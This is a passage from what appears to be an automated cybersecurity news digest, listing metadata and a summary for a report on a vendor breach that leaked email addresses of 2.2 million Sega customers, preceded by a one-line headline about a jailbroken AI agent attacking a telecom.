  - Summary: Jailbroken DeepSeek agent spent two weeks attacking a European telecom, Malbear Labs found

### Cluster 7d60091e06 — score 8

- Title: Email Addresses of 2.2 Million Sega Customers Leaked in Vendor Breach
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-11-09T13:31:00+00:00
- Link: https://www.infosecurity-magazine.com/news/email-sega-customers-vendor-breach/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Gaming company Sega warned customers to be vigilant for suspicious emails after hackers compromised Japanese email delivery provider Arara
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Email Addresses of 2.2 Million Sega Customers Leaked in Vendor Breach
  - Published: 2026-11-09T13:31:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/email-sega-customers-vendor-breach/
  - Summary: Gaming company Sega warned customers to be vigilant for suspicious emails after hackers compromised Japanese email delivery provider Arara
